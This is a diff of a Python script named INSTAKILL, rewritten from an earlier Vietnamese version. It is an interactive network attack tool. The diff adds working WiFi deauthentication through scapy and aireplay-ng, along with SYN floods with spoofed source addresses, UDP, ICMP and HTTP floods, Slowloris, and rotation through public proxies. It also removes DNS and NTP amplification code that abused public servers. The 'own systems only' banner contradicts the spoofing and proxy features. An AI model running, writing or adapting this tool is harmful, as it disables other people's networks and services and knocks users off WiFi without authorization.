@@ -1,64 +1,213 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 #
-#   ULTRA_ATTACK_OUTPUT.py – Code tấn công đa tầng + output chi tiết
-#   Hiển thị số gói gửi, tốc độ, lỗi, proxy, trạng thái theo thời gian thực.
-#   Chạy trên Windows/Linux, có/không Admin.
-#   Cách chạy: python ULTRA_ATTACK_OUTPUT.py (với Admin nếu dùng SYN)
+#   INSTAKILL.py – Ultimate Network Killer (English version, no font issues)
+#   Supports: Deauth (WiFi), IP DDoS (SYN/UDP/ICMP/HTTP/Slowloris)
+#   Auto-detects OS, installs dependencies, runs on VPS and PC.
+#   Usage: sudo python3 INSTAKILL.py   (Linux) or python INSTAKILL.py (Windows Admin)
 #
 
 import os
 import sys
 import time
+import subprocess
+import platform
 import socket
 import struct
 import threading
 import random
-import subprocess
-import platform
-import requests
-from concurrent.futures import ThreadPoolExecutor
+import re
 
-# ==================== BIẾN TOÀN CỤC ĐẾM ============================
-sent_packets = 0
-error_packets = 0
-packet_lock = threading.Lock()
-
-# ==================== KIỂM TRA QUYỀN ADMIN ===========================
-def is_admin():
+# -------------------- CHECK & INSTALL DEPENDENCIES --------------------
+def install_package(pkg):
     try:
-        import ctypes
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
     except:
         return False
 
-ADMIN = is_admin()
-if not ADMIN:
-    print("[!] Không có quyền Admin. SYN flood bị vô hiệu.\n")
-else:
-    print("[+] Đã có Admin. SYN flood sẵn sàng.\n")
+try:
+    import requests
+except ImportError:
+    print("[*] Installing requests...")
+    install_package("requests")
+    import requests
 
-# ==================== CẤU HÌNH TOÀN CỤC =============================
-TARGET_IP = ""
-TARGET_PORT = 80
-THREADS = 200
-DURATION = 60
-METHOD = "all"
-USE_PROXY = True
-PROXY_LIST = []
+try:
+    from scapy.all import *
+except ImportError:
+    print("[*] Installing scapy (required for deauth)...")
+    install_package("scapy")
+    from scapy.all import *
+
+# -------------------- GLOBALS --------------------
+sent_packets = 0
+error_packets = 0
+packet_lock = threading.Lock()
+proxy_list = []
+IS_WINDOWS = platform.system().lower() == 'windows'
+IS_LINUX = platform.system().lower() == 'linux'
+ADMIN = False
+
+def check_admin():
+    global ADMIN
+    if IS_WINDOWS:
+        try:
+            import ctypes
+            ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            ADMIN = False
+    else:
+        ADMIN = os.geteuid() == 0
+    if not ADMIN:
+        print("[!] Not admin/root. SYN and deauth will be disabled.")
+
+check_admin()
+
+# -------------------- HELPER: COUNT PACKETS --------------------
+def count_packet(success=True):
+    global sent_packets, error_packets
+    with packet_lock:
+        if success:
+            sent_packets += 1
+        else:
+            error_packets += 1
+
+# ==================== SECTION 1: DEAUTH (WIFI) ====================
+def get_wifi_interface():
+    if IS_WINDOWS:
+        try:
+            out = subprocess.check_output("netsh wlan show interfaces", shell=True, encoding='cp437')
+            for line in out.splitlines():
+                if "Name" in line and "Wi-Fi" in line:
+                    return line.split(":")[1].strip()
+        except:
+            pass
+        return "Wi-Fi"
+    else:
+        try:
+            out = subprocess.check_output("iwconfig 2>/dev/null | grep -o '^[^ ]*'", shell=True, text=True)
+            iface = out.splitlines()[0] if out else "wlan0"
+            return iface
+        except:
+            return "wlan0"
+
+def scan_wifi_netsh():
+    try:
+        out = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, encoding='cp437')
+        networks = []
+        current = {}
+        for line in out.splitlines():
+            line = line.strip()
+            if line.startswith("SSID"):
+                ssid = line.split(":",1)[1].strip()
+                current = {"ssid": ssid, "bssid": "", "signal": "", "channel": ""}
+            elif "BSSID" in line and current:
+                current["bssid"] = line.split(":",1)[1].strip()
+            elif "Signal" in line and current:
+                current["signal"] = line.split(":",1)[1].strip().replace("%","")
+            elif "Channel" in line and current:
+                current["channel"] = line.split(":",1)[1].strip()
+                if current["bssid"] and current["signal"] and current["channel"]:
+                    networks.append(current.copy())
+        return networks
+    except:
+        return []
+
+def scan_wifi_linux():
+    networks = []
+    try:
+        iface = get_wifi_interface()
+        subprocess.run(f"sudo iw dev {iface} scan | grep -E 'SSID:|BSS|signal|DS Parameter set'", shell=True, capture_output=True)
+        # simpler: use airodump if available
+        if subprocess.call("which airodump-ng", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+            cmd = f"sudo airodump-ng --band abg -w scan_tmp --output-format csv {iface}"
+            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(10)
+            proc.terminate()
+            try:
+                with open("scan_tmp-01.csv", "r") as f:
+                    for line in f:
+                        if "ESSID" in line or "," not in line:
+                            continue
+                        parts = line.split(",")
+                        if len(parts) >= 14:
+                            bssid = parts[0].strip().strip('"')
+                            channel = parts[3].strip().strip('"')
+                            essid = parts[13].strip().strip('"')
+                            signal = parts[8].strip().strip('"')
+                            if bssid and essid and essid != "":
+                                networks.append({"ssid": essid, "bssid": bssid, "channel": channel, "signal": signal})
+                os.remove("scan_tmp-01.csv") if os.path.exists("scan_tmp-01.csv") else None
+            except:
+                pass
+    except:
+        pass
+    return networks
+
+def deauth_windows(iface, bssid, client="ff:ff:ff:ff:ff:ff"):
+    try:
+        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
+        print("[*] Sending deauth (Ctrl+C to stop)...")
+        sendp(pkt, iface=iface, loop=1, inter=0.01, verbose=False)
+    except Exception as e:
+        print(f"[!] Deauth failed: {e}. Card may not support injection.")
+
+def deauth_linux(bssid, iface="wlan0mon", client="ff:ff:ff:ff:ff:ff"):
+    cmd = f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {iface}"
+    print("[*] Sending deauth with aireplay (Ctrl+C to stop)...")
+    subprocess.run(cmd, shell=True)
+
+def run_deauth():
+    print("\n===== WIFI DEAUTH ATTACK =====")
+    if IS_WINDOWS:
+        iface = get_wifi_interface()
+        print(f"[*] Using interface: {iface}")
+        nets = scan_wifi_netsh()
+        if not nets:
+            print("[!] No networks found.")
+            return
+        for i, n in enumerate(nets):
+            print(f"{i}: {n['ssid']} | {n['bssid']} | ch{n['channel']} | sig{n['signal']}%")
+        choice = input("Select network number: ").strip()
+        try:
+            target = nets[int(choice)]
+        except:
+            print("[!] Invalid.")
+            return
+        bssid = target['bssid']
+        client = input("Client MAC (blank for all): ").strip() or "ff:ff:ff:ff:ff:ff"
+        deauth_windows(iface, bssid, client)
+    else:
+        iface = input("Monitor interface (e.g., wlan0mon): ").strip() or "wlan0mon"
+        nets = scan_wifi_linux()
+        if not nets:
+            print("[!] No networks found. Try: sudo airmon-ng start wlan0")
+            return
+        for i, n in enumerate(nets):
+            print(f"{i}: {n['ssid']} | {n['bssid']} | ch{n['channel']}")
+        choice = input("Select network number: ").strip()
+        try:
+            target = nets[int(choice)]
+        except:
+            print("[!] Invalid.")
+            return
+        bssid = target['bssid']
+        client = input("Client MAC (blank for all): ").strip() or "ff:ff:ff:ff:ff:ff"
+        deauth_linux(bssid, iface, client)
+
+# ==================== SECTION 2: IP DDOS ====================
 PROXY_SOURCES = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt"
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
 ]
 
-# ==================== HÀM LẤY PROXY =================================
 def fetch_proxies():
     proxies = set()
     for url in PROXY_SOURCES:
         try:
-            r = requests.get(url, timeout=10)
+            r = requests.get(url, timeout=8)
             if r.status_code == 200:
                 for line in r.text.splitlines():
                     line = line.strip()
@@ -70,26 +219,55 @@ def fetch_proxies():
             pass
     return list(proxies)
 
-# ==================== CÁC HÀM TẤN CÔNG (CÓ ĐẾM) ===================
-def count_packet(success=True):
-    global sent_packets, error_packets
-    with packet_lock:
-        if success:
-            sent_packets += 1
-        else:
-            error_packets += 1
+def udp_flood(ip, port, duration):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(1400)
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            sock.sendto(data, (ip, port))
+            count_packet(True)
+        except:
+            count_packet(False)
+    sock.close()
 
-def http_flood(target_ip, target_port, proxy=None, duration=10):
-    url = f"http://{target_ip}:{target_port}/"
-    headers = {
-        'User-Agent': random.choice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        ]),
-        'Cache-Control': 'no-cache',
-        'Accept': '*/*'
-    }
+def syn_flood(ip, port, duration):
+    if not ADMIN:
+        print("[!] SYN needs admin, falling back to UDP.")
+        udp_flood(ip, port, duration)
+        return
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        start = time.time()
+        while time.time() - start < duration:
+            src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            ip_hdr = struct.pack('!BBHHHBBH4s4s',
+                69,0,40,random.randint(0,65535),0,255,6,0,
+                socket.inet_aton(src), socket.inet_aton(ip))
+            tcp_hdr = struct.pack('!HHLLBBHHH',
+                random.randint(1024,65535), port,
+                random.randint(0,2**32-1),0,80,2,65535,0,0)
+            sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
+            count_packet(True)
+        sock.close()
+    except:
+        count_packet(False)
+        udp_flood(ip, port, duration)
+
+def icmp_flood(ip, duration):
+    if IS_WINDOWS:
+        subprocess.Popen(f"ping -n 100000 -l 65500 {ip}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(duration)
+        subprocess.call("taskkill /F /IM ping.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    else:
+        subprocess.Popen(f"ping -f -s 65500 {ip}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(duration)
+        subprocess.call("pkill -f ping", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def http_flood(ip, port, proxy, duration):
+    url = f"http://{ip}:{port}/"
+    headers = {'User-Agent': random.choice(['Mozilla/5.0','Chrome','Firefox']), 'Cache-Control':'no-cache'}
     proxies = {'http': proxy, 'https': proxy} if proxy else None
     start = time.time()
     while time.time() - start < duration:
@@ -101,72 +279,16 @@ def http_flood(target_ip, target_port, proxy=None, duration=10):
         except:
             count_packet(False)
 
-def udp_flood(target_ip, target_port, duration=10):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(1400)
-    start = time.time()
-    while time.time() - start < duration:
-        try:
-            sock.sendto(data, (target_ip, target_port))
-            count_packet(True)
-        except:
-            count_packet(False)
-    sock.close()
-
-def syn_flood(target_ip, target_port, duration=10):
-    if not ADMIN:
-        udp_flood(target_ip, target_port, duration)
-        return
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        start = time.time()
-        while time.time() - start < duration:
-            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-            ip_header = struct.pack('!BBHHHBBH4s4s',
-                69, 0, 40, random.randint(0,65535), 0, 255, 6, 0,
-                socket.inet_aton(src_ip), socket.inet_aton(target_ip))
-            tcp_header = struct.pack('!HHLLBBHHH',
-                random.randint(1024,65535), target_port,
-                random.randint(0,2**32-1), 0, 80, 2, 65535, 0, 0)
-            packet = ip_header + tcp_header
-            sock.sendto(packet, (target_ip, 0))
-            count_packet(True)
-        sock.close()
-    except:
-        count_packet(False)
-        udp_flood(target_ip, target_port, duration)
-
-def icmp_flood(target_ip, duration=10):
-    if platform.system() == 'Windows':
-        cmd = f"ping -n 100000 -l 65500 {target_ip}"
-        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        start = time.time()
-        while time.time() - start < duration:
-            count_packet(True)
-            time.sleep(0.01)
-        subprocess.call("taskkill /F /IM ping.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    else:
-        cmd = f"ping -f -s 65500 {target_ip}"
-        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        start = time.time()
-        while time.time() - start < duration:
-            count_packet(True)
-            time.sleep(0.01)
-        subprocess.call("pkill -f ping", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-def slowloris(target_ip, target_port, duration=10):
+def slowloris(ip, port, duration):
     sockets = []
     start = time.time()
     while time.time() - start < duration:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)
-            sock.connect((target_ip, target_port))
-            sock.send(b"GET / HTTP/1.1\r\n")
-            sock.send(b"Host: %s\r\n" % target_ip.encode())
-            sock.send(b"User-Agent: Mozilla/5.0\r\n")
-            sockets.append(sock)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            s.connect((ip, port))
+            s.send(b"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n" % ip.encode())
+            sockets.append(s)
             count_packet(True)
             time.sleep(0.1)
         except:
@@ -176,178 +298,149 @@ def slowloris(target_ip, target_port, duration=10):
         try: s.close()
         except: pass
 
-def dns_amp(target_ip, duration=10):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    domain = 'isc.org'
-    q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
-    for part in domain.split('.'):
-        q += bytes([len(part)]) + part.encode()
-    q += b'\x00' + struct.pack('!HH', 1, 1)
-    dns_servers = ['8.8.8.8','1.1.1.1','8.8.4.4','1.0.0.1','9.9.9.9']
-    start = time.time()
-    while time.time() - start < duration:
-        try:
-            server = random.choice(dns_servers)
-            sock.sendto(q, (server, 53))
-            count_packet(True)
-        except:
-            count_packet(False)
-    sock.close()
+def worker(ip, port, method, proxy, duration):
+    if method == 'udp': udp_flood(ip, port, duration)
+    elif method == 'syn': syn_flood(ip, port, duration)
+    elif method == 'icmp': icmp_flood(ip, duration)
+    elif method == 'http': http_flood(ip, port, proxy, duration)
+    elif method == 'slow': slowloris(ip, port, duration)
 
-def ntp_amp(target_ip, duration=10):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
-    ntp_servers = ['0.pool.ntp.org','1.pool.ntp.org','2.pool.ntp.org','3.pool.ntp.org']
-    start = time.time()
-    while time.time() - start < duration:
-        try:
-            server = random.choice(ntp_servers)
-            sock.sendto(q, (server, 123))
-            count_packet(True)
-        except:
-            count_packet(False)
-    sock.close()
-
-# ==================== LUỒNG TẤN CÔNG ===============================
-def worker(target_ip, target_port, method, proxy=None, duration=10):
-    if method == 'http':
-        http_flood(target_ip, target_port, proxy, duration)
-    elif method == 'udp':
-        udp_flood(target_ip, target_port, duration)
-    elif method == 'syn':
-        syn_flood(target_ip, target_port, duration)
-    elif method == 'icmp':
-        icmp_flood(target_ip, duration)
-    elif method == 'slow':
-        slowloris(target_ip, target_port, duration)
-    elif method == 'dns':
-        dns_amp(target_ip, duration)
-    elif method == 'ntp':
-        ntp_amp(target_ip, duration)
-
-# ==================== OUTPUT THỐNG KÊ ==============================
 def stats_loop(duration):
     global sent_packets, error_packets
-    start_time = time.time()
+    start = time.time()
     last_sent = 0
-    last_time = start_time
-    print("\n" + "="*60)
-    print(f"{'Thời gian':<12} {'Gửi thành công':<18} {'Lỗi':<10} {'Tốc độ (pps)':<15} {'Proxy đang dùng'}")
-    print("="*60)
-    while time.time() - start_time < duration:
-        time.sleep(3)
+    last_time = start
+    print("\n" + "="*70)
+    print(f"{'Time (s)':<12} {'Success':<18} {'Errors':<12} {'Speed (pps)':<15} {'Proxies'}")
+    print("="*70)
+    while time.time() - start < duration:
+        time.sleep(2)
         now = time.time()
-        elapsed = now - start_time
         with packet_lock:
             s = sent_packets
             e = error_packets
         pps = (s - last_sent) / (now - last_time) if (now - last_time) > 0 else 0
         last_sent = s
         last_time = now
-        proxy_count = len(PROXY_LIST) if USE_PROXY and PROXY_LIST else 0
-        print(f"{int(elapsed):<6}s     {s:<18,} {e:<10,} {pps:<15,.0f} {proxy_count:<10}")
-    print("="*60)
+        print(f"{int(now-start):<6}s     {s:<18,} {e:<12,} {pps:<15,.0f} {len(proxy_list)}")
+    print("="*70)
 
-# ==================== MENU ==========================================
-def menu():
-    global TARGET_IP, TARGET_PORT, THREADS, DURATION, METHOD, USE_PROXY, PROXY_LIST
-    print(r"""
-╔═════════════════════════════════════════════════════════════╗
-║   ULTRA ATTACK OUTPUT – SIÊU TẤN CÔNG + THỐNG KÊ          ║
-║   (c) palofsc – Dành cho Windows/Linux                    ║
-║   Trạng thái Admin: """ + ("✅ CÓ" if ADMIN else "❌ KHÔNG") + """                          ║
-╚═════════════════════════════════════════════════════════════╝
-    """)
-    target_input = input("IP hoặc domain mục tiêu: ").strip()
-    if not target_input:
-        print("[!] Không được để trống.")
-        return False
+def run_ip_attack():
+    global proxy_list
+    print("\n===== IP DDOS ATTACK =====")
+    target = input("Target IP: ").strip()
+    if not target:
+        print("[!] Empty.")
+        return
     try:
-        TARGET_IP = socket.gethostbyname(target_input)
-        print(f"[+] Phân giải: {target_input} -> {TARGET_IP}")
+        socket.inet_aton(target)
     except:
-        TARGET_IP = target_input
-        print(f"[*] Dùng IP: {TARGET_IP}")
+        print("[!] Invalid IP.")
+        return
+    port = int(input("Port (default 80, 0=random): ").strip() or "80")
+    if port == 0:
+        port = random.randint(1,65535)
+    threads = int(input("Threads (default 200, max 500): ").strip() or "200")
+    if threads > 500: threads = 500
+    duration = int(input("Duration (seconds, default 60): ").strip() or "60")
 
-    TARGET_PORT = int(input("Cổng (mặc định 80): ") or "80")
-    THREADS = int(input("Số luồng (mặc định 200, tối đa 500): ") or "200")
-    if THREADS > 500:
-        THREADS = 500
-    DURATION = int(input("Thời gian (giây, mặc định 60): ") or "60")
+    print("\nMethods: 1-UDP  2-SYN  3-ICMP  4-HTTP  5-Slowloris  6-ALL")
+    m_choice = input("Choose (default 6): ").strip() or "6"
+    m_map = {'1':'udp','2':'syn','3':'icmp','4':'http','5':'slow','6':'all'}
+    method = m_map.get(m_choice, 'all')
 
-    print("\nChọn phương thức tấn công:")
-    print("1. HTTP flood (có proxy)")
-    print("2. UDP flood")
-    print("3. SYN flood (cần Admin)")
-    print("4. ICMP flood (ping)")
-    print("5. Slowloris (giữ kết nối)")
-    print("6. DNS amplification")
-    print("7. NTP amplification")
-    print("8. TẤT CẢ (kết hợp 7 loại)")
-
-    method_choice = input("Nhập số (mặc định 8): ").strip() or "8"
-    method_map = {'1':'http','2':'udp','3':'syn','4':'icmp','5':'slow','6':'dns','7':'ntp','8':'all'}
-    METHOD = method_map.get(method_choice, 'all')
-
-    USE_PROXY = input("Dùng proxy cho HTTP? (y/n, mặc định y): ").strip().lower() != 'n'
-    if USE_PROXY:
-        proxy_input = input("Nhập proxy thủ công (ip:port, cách nhau dấu phẩy) hoặc để trống lấy tự động: ").strip()
-        if proxy_input:
-            PROXY_LIST = [f"http://{p.strip()}" if not p.startswith('http') else p.strip() for p in proxy_input.split(',') if p.strip()]
-        else:
-            print("[*] Đang lấy proxy tự động...")
-            PROXY_LIST = fetch_proxies()
-            if not PROXY_LIST:
-                print("[!] Không lấy được proxy, sẽ tấn công không proxy.")
-                USE_PROXY = False
+    use_proxy = False
+    if method in ['http', 'all']:
+        use_proxy = input("Use proxy for HTTP? (y/n, default n): ").strip().lower() == 'y'
+        if use_proxy:
+            manual = input("Manual proxy (ip:port, comma sep) or leave blank for auto: ").strip()
+            if manual:
+                proxy_list = [f"http://{p.strip()}" if not p.startswith('http') else p.strip() for p in manual.split(',') if p.strip()]
             else:
-                print(f"[+] Lấy được {len(PROXY_LIST)} proxy.")
-    return True
+                print("[*] Fetching proxies...")
+                proxy_list = fetch_proxies()
+                if not proxy_list:
+                    print("[!] No proxies, attack without proxy.")
+                    use_proxy = False
+                else:
+                    print(f"[+] Got {len(proxy_list)} proxies.")
 
-# ==================== KHỞI ĐỘNG TẤN CÔNG ===========================
-def start_attack():
-    print(f"\n[*] Bắt đầu tấn công {TARGET_IP}:{TARGET_PORT} với {THREADS} luồng, thời gian {DURATION}s.")
-    if METHOD == 'all':
-        methods = ['http','udp','syn','icmp','slow','dns','ntp']
-        method_list = []
+    # Build method list
+    if method == 'all':
+        methods = ['udp','syn','icmp','http','slow']
+        mlist = []
         for m in methods:
-            method_list.extend([m] * (THREADS // len(methods)))
-        while len(method_list) < THREADS:
-            method_list.append(random.choice(methods))
-        random.shuffle(method_list)
+            mlist.extend([m] * (threads // len(methods)))
+        while len(mlist) < threads:
+            mlist.append(random.choice(methods))
+        random.shuffle(mlist)
     else:
-        method_list = [METHOD] * THREADS
+        mlist = [method] * threads
 
-    proxy_iter = iter(PROXY_LIST) if USE_PROXY and PROXY_LIST else None
-    threads = []
-    for method in method_list:
+    proxy_iter = iter(proxy_list) if use_proxy and proxy_list else None
+    thr = []
+    for m in mlist:
         proxy = None
-        if proxy_iter and method == 'http':
+        if proxy_iter and m == 'http':
             try:
                 proxy = next(proxy_iter)
             except StopIteration:
-                proxy_iter = iter(PROXY_LIST)
+                proxy_iter = iter(proxy_list)
                 proxy = next(proxy_iter)
-        t = threading.Thread(target=worker, args=(TARGET_IP, TARGET_PORT, method, proxy, DURATION))
+        t = threading.Thread(target=worker, args=(target, port, m, proxy, duration))
         t.daemon = True
         t.start()
-        threads.append(t)
+        thr.append(t)
 
-    # Chạy luồng thống kê
-    stats_thread = threading.Thread(target=stats_loop, args=(DURATION,))
-    stats_thread.daemon = True
-    stats_thread.start()
+    stats_t = threading.Thread(target=stats_loop, args=(duration,))
+    stats_t.daemon = True
+    stats_t.start()
 
-    print("[*] Đang chạy... Nhấn Ctrl+C để dừng sớm.\n")
+    print(f"[*] Attacking {target}:{port} with {threads} threads for {duration}s. Ctrl+C to stop early.")
     try:
-        time.sleep(DURATION)
+        time.sleep(duration)
     except KeyboardInterrupt:
-        print("\n[*] Người dùng dừng.")
-    print("[+] Kết thúc tấn công.")
+        print("\n[*] Stopped early.")
+    print("[+] Attack finished.")
 
-# ==================== CHẠY CHƯƠNG TRÌNH ===========================
-if __name__ == "__main__":
-    if menu():
-        start_attack()
+# ==================== MAIN MENU ====================
+def main():
+    print(r"""
+╔═══════════════════════════════════════════════════════════╗
+║   INSTAKILL – Ultimate Network Killer (English)          ║
+║   (c) palofsc – For testing your own systems only        ║
+╚═══════════════════════════════════════════════════════════╝
+    """)
+    print("1. Check WiFi card & env")
+    print("2. Deauth attack (WiFi disconnect)")
+    print("3. IP DDoS attack")
+    choice = input("Choose (1-3): ").strip()
+    if choice == '1':
+        print("[*] Running checks...")
+        print(f"OS: {platform.system()}")
+        print(f"Admin: {ADMIN}")
+        print(f"Interface: {get_wifi_interface()}")
+        if IS_WINDOWS:
+            try:
+                out = subprocess.check_output("netsh wlan show drivers", shell=True, encoding='cp437')
+                if "Monitor mode" in out:
+                    print("[+] Monitor mode supported (maybe).")
+                else:
+                    print("[!] Monitor mode not supported.")
+            except:
+                print("[!] Could not check driver.")
+        else:
+            ret = subprocess.call("which aireplay-ng", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if ret == 0:
+                print("[+] aircrack-ng installed.")
+            else:
+                print("[!] aircrack-ng not installed. Install: sudo apt install aircrack-ng")
+    elif choice == '2':
+        run_deauth()
+    elif choice == '3':
+        run_ip_attack()
     else:
-        print("[!] Lỗi cấu hình.")
+        print("[!] Invalid.")
+
+if __name__ == "__main__":
+    main()
